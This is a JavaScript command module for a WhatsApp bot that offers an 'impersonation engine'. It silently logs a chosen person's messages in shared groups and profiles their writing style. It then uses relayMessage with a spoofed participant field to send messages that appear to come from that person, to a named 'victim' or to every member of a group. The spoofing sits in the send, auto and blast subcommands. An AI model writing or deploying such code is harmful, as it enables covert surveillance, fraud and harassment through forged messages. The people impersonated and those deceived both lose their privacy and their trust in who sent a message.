module.exports = {
    name: "impersonate",
    aliases: ["mimic", "stylelearn", "imp"],
    category: "spicy",
    permissions: { coin: 0, group: false, owner: true },
    code: async (ctx) => {
        try {
            const fs   = require("node:fs");
            const path = require("node:path");
            const args = ctx.args || [];
            const sub  = args[0]?.toLowerCase();

            const dataDir = path.join(process.cwd(), "impersonation");
            if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);

            const getProfile = (number) => {
                const file = path.join(dataDir, `${number}.json`);
                try { return JSON.parse(fs.readFileSync(file, "utf8")); } catch {
                    return {
                        number,
                        messages: [],
                        patterns: {},
                        createdAt: new Date().toISOString()
                    };
                }
            };

            const saveProfile = (number, profile) => {
                const file = path.join(dataDir, `${number}.json`);
                fs.writeFileSync(file, JSON.stringify(profile, null, 2), "utf8");
            };

            if (!sub) {
                return await ctx.reply(
                    "*Impersonation Engine*\n\n" +
                    "`.imp learn <number>` — start learning target's style\n" +
                    "`.imp stop <number>` — stop learning\n" +
                    "`.imp list` — show all learned profiles\n" +
                    "`.imp profile <number>` — show learned patterns\n" +
                    "`.imp send <number> <victim> <message>` — send as target to victim\n" +
                    "`.imp auto <number> <victim>` — auto-generate + send in target's style\n" +
                    "`.imp blast <number> <message>` — send as target to all group members\n" +
                    "`.imp clear <number>` — wipe learned profile"
                );
            }

            const sock = ctx.core || ctx.sock || ctx.client;

            // LEARN
            if (sub === "learn") {
                const number = args[1]?.replace(/[^0-9]/g, "");
                if (!number) return await ctx.reply("❌ Provide a number.");

                const tracking = path.join(dataDir, "tracking.json");
                let tracked = [];
                try { tracked = JSON.parse(fs.readFileSync(tracking, "utf8")); } catch {}

                if (!tracked.includes(number)) {
                    tracked.push(number);
                    fs.writeFileSync(tracking, JSON.stringify(tracked, null, 2), "utf8");
                }

                const profile = getProfile(number);
                await ctx.reply(
                    `✅ Now learning style of +${number}\n` +
                    `Messages logged so far: ${profile.messages.length}\n\n` +
                    `Bot will silently collect their messages in all shared groups.\n` +
                    `Run \`.imp profile ${number}\` to see patterns once enough is collected.`
                );
                return;
            }

            // STOP
            if (sub === "stop") {
                const number = args[1]?.replace(/[^0-9]/g, "");
                if (!number) return await ctx.reply("❌ Provide a number.");

                const tracking = path.join(dataDir, "tracking.json");
                let tracked = [];
                try { tracked = JSON.parse(fs.readFileSync(tracking, "utf8")); } catch {}
                tracked = tracked.filter(n => n !== number);
                fs.writeFileSync(tracking, JSON.stringify(tracked, null, 2), "utf8");

                await ctx.reply(`✅ Stopped learning +${number}`);
                return;
            }

            // LIST
            if (sub === "list") {
                const tracking = path.join(dataDir, "tracking.json");
                let tracked = [];
                try { tracked = JSON.parse(fs.readFileSync(tracking, "utf8")); } catch {}

                if (tracked.length === 0) return await ctx.reply("📭 No profiles being learned.");

                const lines = tracked.map((n, i) => {
                    const p = getProfile(n);
                    return `${i + 1}. +${n} — ${p.messages.length} messages logged`;
                });

                await ctx.reply(`*Impersonation Profiles*\n\n${lines.join("\n")}`);
                return;
            }

            // PROFILE
            if (sub === "profile") {
                const number = args[1]?.replace(/[^0-9]/g, "");
                if (!number) return await ctx.reply("❌ Provide a number.");

                const profile = getProfile(number);
                if (profile.messages.length === 0) {
                    return await ctx.reply(`❌ No data for +${number} yet. Start with .imp learn ${number}`);
                }

                const analysis = analyzeStyle(profile.messages);

                await ctx.reply(
                    `*Style Profile — +${number}*\n\n` +
                    `*»* *DATA*\n` +
                    `  › Messages logged: ${profile.messages.length}\n` +
                    `  › Avg message length: ${analysis.avgLength} chars\n` +
                    `  › Uses lowercase: ${analysis.usesLowercase ? "Yes" : "No"}\n` +
                    `  › Uses punctuation: ${analysis.usesPunctuation ? "Yes" : "No"}\n` +
                    `  › Uses emoji: ${analysis.usesEmoji ? "Yes" : "No"}\n` +
                    `  › Avg words per message: ${analysis.avgWords}\n\n` +
                    `*»* *TOP WORDS*\n` +
                    `  ${analysis.topWords.join(", ")}\n\n` +
                    `*»* *COMMON PHRASES*\n` +
                    `  ${analysis.phrases.join("\n  ") || "not enough data"}\n\n` +
                    `*»* *SAMPLE MESSAGES*\n` +
                    profile.messages.slice(-5).map(m => `  "${m.text}"`).join("\n")
                );
                return;
            }

            // SEND — manual message as target
            if (sub === "send") {
                const number  = args[1]?.replace(/[^0-9]/g, "");
                const victim  = args[2]?.replace(/[^0-9]/g, "");
                const message = args.slice(3).join(" ");

                if (!number || !victim || !message) {
                    return await ctx.reply("❌ Usage: .imp send <number> <victim> <message>");
                }

                const targetJid = `${number}@s.whatsapp.net`;
                const victimJid = `${victim}@s.whatsapp.net`;

                // apply style transformation
                const profile  = getProfile(number);
                const analysis = analyzeStyle(profile.messages);
                const styled   = applyStyle(message, analysis);

                await sock.relayMessage(
                    victimJid,
                    { conversation: styled },
                    {
                        messageId: `IMP_${Date.now()}`,
                        participant: targetJid,
                        additionalAttributes: { participant: targetJid }
                    }
                );

                await ctx.reply(
                    `✅ Sent as +${number} → +${victim}\n` +
                    `Original: "${message}"\n` +
                    `Styled:   "${styled}"`
                );
                return;
            }

            // AUTO — generate message in target's style using their vocabulary
            if (sub === "auto") {
                const number = args[1]?.replace(/[^0-9]/g, "");
                const victim = args[2]?.replace(/[^0-9]/g, "");

                if (!number || !victim) {
                    return await ctx.reply("❌ Usage: .imp auto <number> <victim>");
                }

                const profile = getProfile(number);
                if (profile.messages.length < 10) {
                    return await ctx.reply(`❌ Need at least 10 messages to auto-generate. Currently: ${profile.messages.length}`);
                }

                const analysis  = analyzeStyle(profile.messages);
                const generated = generateMessage(profile.messages, analysis);

                const targetJid = `${number}@s.whatsapp.net`;
                const victimJid = `${victim}@s.whatsapp.net`;

                await sock.relayMessage(
                    victimJid,
                    { conversation: generated },
                    {
                        messageId: `IMP_${Date.now()}`,
                        participant: targetJid,
                        additionalAttributes: { participant: targetJid }
                    }
                );

                await ctx.reply(
                    `✅ Auto-generated + sent as +${number} → +${victim}\n` +
                    `Generated: "${generated}"`
                );
                return;
            }

            // BLAST — send as target to all members of current group
            if (sub === "blast") {
                const number  = args[1]?.replace(/[^0-9]/g, "");
                const message = args.slice(2).join(" ");
                const groupJid = ctx.msg?.key?.remoteJid;

                if (!number || !message) {
                    return await ctx.reply("❌ Usage: .imp blast <number> <message> (run in target group)");
                }

                if (!groupJid?.endsWith("@g.us")) {
                    return await ctx.reply("❌ Run inside a group.");
                }

                const meta    = await sock.groupMetadata(groupJid);
                const botJid  = sock.user?.id?.replace(/:.*@/, "@") || "";
                const targets = meta.participants.filter(p =>
                    p.id !== botJid && p.id.split("@")[0] !== number
                );

                const profile  = getProfile(number);
                const analysis = analyzeStyle(profile.messages);
                const styled   = applyStyle(message, analysis);
                const targetJid = `${number}@s.whatsapp.net`;

                await ctx.reply(`💀 Blasting as +${number} to ${targets.length} members...`);

                let sent = 0;
                let failed = 0;

                for (const p of targets) {
                    try {
                        await sock.relayMessage(
                            p.id,
                            { conversation: styled },
                            {
                                messageId: `IMP_${Date.now()}_${Math.random().toString(36).slice(2)}`,
                                participant: targetJid,
                                additionalAttributes: { participant: targetJid }
                            }
                        );
                        sent++;
                        await new Promise(r => setTimeout(r, 1500));
                    } catch {
                        failed++;
                    }
                }

                await ctx.reply(
                    `✅ Blast complete.\nSent: ${sent}\nFailed: ${failed}\n` +
                    `Message appeared from: +${number}`
                );
                return;
            }

            // CLEAR
            if (sub === "clear") {
                const number = args[1]?.replace(/[^0-9]/g, "");
                if (!number) return await ctx.reply("❌ Provide a number.");

                const file = path.join(dataDir, `${number}.json`);
                if (fs.existsSync(file)) fs.unlinkSync(file);
                await ctx.reply(`✅ Profile cleared for +${number}`);
                return;
            }

            await ctx.reply("❌ Unknown subcommand. Type `.imp` for help.");

        } catch (e) {
            console.error("[impersonate]", e);
            await ctx.reply("❌ " + e.message);
        }
    }
};

// ── STYLE ANALYSIS ENGINE ──
function analyzeStyle(messages) {
    if (!messages.length) return {};

    const texts = messages.map(m => m.text).filter(Boolean);

    // avg length
    const avgLength = Math.round(
        texts.reduce((s, t) => s + t.length, 0) / texts.length
    );

    // avg words
    const avgWords = Math.round(
        texts.reduce((s, t) => s + t.split(/\s+/).length, 0) / texts.length
    );

    // lowercase tendency
    const lowercaseCount = texts.filter(t => t === t.toLowerCase()).length;
    const usesLowercase  = lowercaseCount / texts.length > 0.6;

    // punctuation tendency
    const punctCount    = texts.filter(t => /[.!?]$/.test(t.trim())).length;
    const usesPunctuation = punctCount / texts.length > 0.4;

    // emoji tendency
    const emojiRegex  = /\p{Emoji}/u;
    const emojiCount  = texts.filter(t => emojiRegex.test(t)).length;
    const usesEmoji   = emojiCount / texts.length > 0.2;

    // word frequency
    const wordFreq = {};
    texts.forEach(t => {
        t.toLowerCase().split(/\s+/).forEach(w => {
            if (w.length > 3) wordFreq[w] = (wordFreq[w] || 0) + 1;
        });
    });
    const topWords = Object.entries(wordFreq)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 10)
        .map(([w]) => w);

    // common phrases (bigrams)
    const phraseFreq = {};
    texts.forEach(t => {
        const words = t.toLowerCase().split(/\s+/);
        for (let i = 0; i < words.length - 1; i++) {
            const bigram = `${words[i]} ${words[i + 1]}`;
            if (bigram.length > 6) {
                phraseFreq[bigram] = (phraseFreq[bigram] || 0) + 1;
            }
        }
    });
    const phrases = Object.entries(phraseFreq)
        .filter(([, c]) => c > 1)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5)
        .map(([p]) => p);

    // sentence starters
    const starters = texts
        .map(t => t.trim().split(/\s+/)[0]?.toLowerCase())
        .filter(Boolean);
    const starterFreq = {};
    starters.forEach(s => starterFreq[s] = (starterFreq[s] || 0) + 1);
    const topStarters = Object.entries(starterFreq)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5)
        .map(([s]) => s);

    return {
        avgLength,
        avgWords,
        usesLowercase,
        usesPunctuation,
        usesEmoji,
        topWords,
        phrases,
        topStarters
    };
}

// ── STYLE APPLICATION ──
function applyStyle(message, analysis) {
    if (!analysis || !Object.keys(analysis).length) return message;

    let styled = message;

    // apply lowercase tendency
    if (analysis.usesLowercase) {
        styled = styled.toLowerCase();
    }

    // remove punctuation if target doesn't use it
    if (!analysis.usesPunctuation) {
        styled = styled.replace(/[.!?]$/g, "");
    }

    // trim to match avg length roughly
    if (analysis.avgLength && styled.length > analysis.avgLength * 2) {
        styled = styled.slice(0, analysis.avgLength * 2).trim();
    }

    return styled;
}

// ── MESSAGE GENERATOR ──
// builds a new message using target's actual vocabulary + sentence patterns
function generateMessage(messages, analysis) {
    const texts = messages.map(m => m.text).filter(Boolean);
    if (texts.length < 5) return texts[Math.floor(Math.random() * texts.length)];

    // markov-lite — pick a random real message and mutate it
    // using the target's own words
    const base = texts[Math.floor(Math.random() * texts.length)];
    const words = base.split(/\s+/);

    // swap some words with top words from their vocabulary
    if (analysis.topWords?.length > 3) {
        const swapIdx = Math.floor(Math.random() * words.length);
        words[swapIdx] = analysis.topWords[Math.floor(Math.random() * analysis.topWords.length)];
    }

    let generated = words.join(" ");

    // apply style
    generated = applyStyle(generated, analysis);

    return generated;
}